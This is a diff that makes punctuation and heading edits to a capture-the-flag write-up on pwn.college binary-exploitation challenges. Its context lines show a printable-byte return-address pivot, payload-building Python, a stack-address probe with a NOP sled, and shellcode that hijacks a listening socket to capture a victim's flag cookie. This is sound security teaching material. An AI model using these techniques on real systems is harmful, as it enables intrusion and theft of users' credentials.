@@ -2111,7 +2111,7 @@ LABEL_6:
 }
 ```
 
-**`handle_4()`** renders a sprite onto the canvas. It reads 9 parameter bytes: `[sprite_id, R, G, B, src_x, src_y, dest_w, dest_h, transparency_key]`. The canvas stores each pixel as a 24-byte ANSI escape sequence `\x1b[38;2;RRR;GGG;BBMc\x1b[0m`, where the character `c` is at byte offset 19. handle_4 writes each sprite byte directly into the `c` position of the corresponding pixel — **no printable-ASCII validation**, unlike handle_2 and handle_3. Pixels whose sprite byte equals `transparency_key` are skipped.
+**`handle_4()`** renders a sprite onto the canvas. It reads 9 parameter bytes: `[sprite_id, R, G, B, src_x, src_y, dest_w, dest_h, transparency_key]`. The canvas stores each pixel as a 24-byte ANSI escape sequence `\x1b[38;2;RRR;GGG;BBMc\x1b[0m`, where the character `c` is at byte offset 19. handle_4 writes each sprite byte directly into the `c` position of the corresponding pixel, **no printable-ASCII validation**, unlike handle_2 and handle_3. Pixels whose sprite byte equals `transparency_key` are skipped.
 
 ```c title="/challenge/integration-cimg-screenshot-sc :: handle_4() :: Pseudocode" showLineNumbers
 // positive sp value has been detected, the output may be wrong!
@@ -2444,7 +2444,7 @@ hacker@integrated-security~integration-cimg-screenshot-win:~$ checksec /challeng
 This is the NX variant of the cIMG screenshot challenge. The format, canvas, and handle_1337 stack overflow are identical to the shellcode variant, but there is no `handle_5`, the stack is non-executable, and ASLR is enabled.
 
 **Differences from the shellcode variant:**
-- No `handle_5` (the file-loading handler) — only handle_1, 2, 3, 4, 6, 7 and handle_1337 exist.
+- No `handle_5` (the file-loading handler), only handle_1, 2, 3, 4, 6, 7 and handle_1337 exist.
 - `handle_1/2/3` all validate every pixel's char byte to the printable range 0x20–0x7e before writing to the canvas. There is no mechanism to write non-printable bytes into the canvas.
 - NX enabled: shellcode on the stack cannot be executed.
 - ASLR enabled: no `disable_aslr()` constructor as in the shellcode variant.
@@ -2460,14 +2460,14 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 
 **The problem with `win()` sub-instances**: every repeated open/read/write block inside `win()` past the first one does `read(fd, rbp, 256)` without setting up `rbp` first. `rbp` at this point comes from `handle_1337()`'s saved frame and is garbage (all printable bytes, not a valid address). However, one particular success path inside `win()` is different.
 
-**0x403b42 — the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';' — both printable) is the success branch after a `read()` inside `win()`'s repeating loop. Its first instruction is:
+**0x403b42, the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';', both printable) is the success branch after a `read()` inside `win()`'s repeating loop. Its first instruction is:
 
 ```asm
 403b42:  48 89 e5   mov %rsp, %rbp    ; rbp = rsp (valid stack pointer!)
 403b45:  48 63 d0   movslq %eax,%rdx
 403b48:  bf 01 00 00 00  mov $0x1,%edi
 403b4d:  48 89 ee   mov %rbp,%rsi
-403b50:  call write@plt                ; write(1, rsp, rdx) — dumps some stack bytes
+403b50:  call write@plt                ; write(1, rsp, rdx), dumps some stack bytes
 403b55:  ...
 403b61:  lea ["/flag"], rdi
 403b6a:  xor esi, esi
@@ -2489,7 +2489,7 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 
 When jumped to directly from `handle_1337()`'s `ret`:
 1. `mov rsp, rbp` sets rbp to the CURRENT stack pointer (main's rsp, a valid writable address).
-2. An initial `write(1, rsp, rdx)` with `rdx` from handle_1337's leftover `eax` (harmless — likely 0 or small).
+2. An initial `write(1, rsp, rdx)` with `rdx` from handle_1337's leftover `eax` (harmless, likely 0 or small).
 3. `open("/flag", 0)` returns a valid fd.
 4. `read(fd, rbp=rsp, 256)` reads the flag onto the stack.
 5. `write(1, rbp=rsp, bytes_read)` outputs the flag.
@@ -2518,9 +2518,9 @@ DIRECTIVES = 2
 pixel_data = b''
 for i in range(CANVAS_W):
     if i == 168:
-        c = 0x42   # 'B' — ret addr byte 0
+        c = 0x42   # 'B', ret addr byte 0
     elif i == 169:
-        c = 0x3b   # ';' — ret addr byte 1
+        c = 0x3b   # ';', ret addr byte 1
     else:
         c = 0x41   # 'A' filler (printable)
     pixel_data += bytes([0x41, 0x41, 0x41, c])
@@ -2766,8 +2766,8 @@ So fd 4 (the client socket) stays open. Meanwhile `close(fildes)` in `send_file`
 
 ```
 server_fd = 3  (socket(), stays open in challenge())
-client_fd = 4  (accept(), never closed — our write target)
-file_fd   = 5  (open() in send_file(), closed before ret — reused by open("/flag"))
+client_fd = 4  (accept(), never closed, our write target)
+file_fd   = 5  (open() in send_file(), closed before ret, reused by open("/flag"))
 ```
 
 Since ASLR is disabled by the constructor, the stack is deterministic. We need to know the runtime address of `content[0]` to aim our NOP sled. Attaching a debugger is blocked in this environment by ptrace restrictions, so instead we write a probe binary that mimics the exact call chain from the real binary.
@@ -2850,7 +2850,7 @@ content[0] = 0x7fffffffa728
 ret addr slot = 0x7fffffffc738
 ```
 
-Three consistent runs give `content[0] = 0x7fffffffa728`. The address the probe prints is the address of `content[0]` in the real binary — not just the probe's own stack — because by constructing the identical chain of frame sizes on the same deterministic stack base, we arrive at the identical position.
+Three consistent runs give `content[0] = 0x7fffffffa728`. The address the probe prints is the address of `content[0]` in the real binary, not just the probe's own stack, because by constructing the identical chain of frame sizes on the same deterministic stack base, we arrive at the identical position.
 
 The NOP sled center is at `0x7fffffffa728 + 122 + 3000 = 0x7fffffffb35a`. Rather than pointing `ret` at the exact first byte of shellcode, we prepend 6000 NOP bytes so that any address landing anywhere in the sled slides forward into the shellcode, giving us margin for error.
 
@@ -2968,6 +2968,8 @@ The response is 8373 bytes: 8313 from the normal HTTP response path, plus 60 byt
 &nbsp;
 
 ## Watering Hole
+
+### Binary analysis
 
 ```
 hacker@integrated-security~watering-hole:~$ checksec /challenge/server
@@ -3170,7 +3172,7 @@ The size check still only enforces the file alone is under 8192 bytes, and the `
 # ---- snip ----
 ```
 
-Two new constraints make this harder than the previous challenge. First, `challenge()` drops privileges before entering the accept loop. The disassembly confirms `setresgid` and `setresuid` are both called with `0xFFFE` (65534) for all three IDs, and immediately after asserts that `/flag` cannot be opened — confirming our shellcode has no direct access to the flag:
+Two new constraints make this harder than the previous challenge. First, `challenge()` drops privileges before entering the accept loop. The disassembly confirms `setresgid` and `setresuid` are both called with `0xFFFE` (65534) for all three IDs, and immediately after asserts that `/flag` cannot be opened, confirming our shellcode has no direct access to the flag:
 
 ```asm title="/challenge/server :: challenge() :: Disassembly"
 # ---- snip ----
@@ -3206,7 +3208,7 @@ Host: localhost
 Cookie: flag=pwn.college{...}
 ```
 
-The server socket (fd 3) stays open and in LISTEN state after `send_file`'s `ret` is hijacked. The disassembly confirms `close(client_fd)` only runs after `handle_connection` returns normally — which never happens when we hijack `ret`:
+The server socket (fd 3) stays open and in LISTEN state after `send_file`'s `ret` is hijacked. The disassembly confirms `close(client_fd)` only runs after `handle_connection` returns normally, which never happens when we hijack `ret`:
 
 ```asm title="/challenge/server :: challenge() :: Disassembly"
 # ---- snip ----
@@ -3219,11 +3221,11 @@ The server socket (fd 3) stays open and in LISTEN state after `send_file`'s `ret
 # ---- snip ----
 ```
 
-`victim` checks for a LISTEN on port 80 via `psutil.net_connections()` — since fd 3 is still alive, this check passes and it connects. So instead of reading `/flag`, our shellcode just needs to keep listening on fd 3 and intercept the victim's connection.
+`victim` checks for a LISTEN on port 80 via `psutil.net_connections()`, since fd 3 is still alive, this check passes and it connects. So instead of reading `/flag`, our shellcode just needs to keep listening on fd 3 and intercept the victim's connection.
 
 ```
-server_fd = 3  (socket(), stays open — our accept() target)
-client_fd = 4  (accept(), never closed after hijacked ret — closed by shellcode to unblock our client)
+server_fd = 3  (socket(), stays open, our accept() target)
+client_fd = 4  (accept(), never closed after hijacked ret, closed by shellcode to unblock our client)
 file_fd   = 5  (open() in send_file(), closed before ret)
 ```
 
@@ -3241,7 +3243,7 @@ The `Server:` string has 24 threes (`pwnserver/1.333333333333333333333333.7`), m
 
 Return address slot: `0x2008 + 8 = 8208` bytes from `content[0]` → **file byte `8208 - 133 = 8075`**.
 
-Since ASLR is disabled and ptrace is blocked, we use the same probe technique as before. The probe mimics the exact call-chain frame sizes from the IDA disassembly — identical to the previous challenge since `send_file` and `handle_connection` are unchanged:
+Since ASLR is disabled and ptrace is blocked, we use the same probe technique as before. The probe mimics the exact call-chain frame sizes from the IDA disassembly, identical to the previous challenge since `send_file` and `handle_connection` are unchanged:
 
 ```c
 #define _GNU_SOURCE 1
@@ -3427,7 +3429,7 @@ if m:
     print(f'[+] FLAG: {m.group(0)}')
 ```
 
-Run the exploit directly — it starts the server itself since the one-shot constraint means we can't pre-launch it separately:
+Run the exploit directly, it starts the server itself since the one-shot constraint means we can't pre-launch it separately:
 
 ```
 hacker@integrated-security~watering-hole:~$ python ~/exploit.py
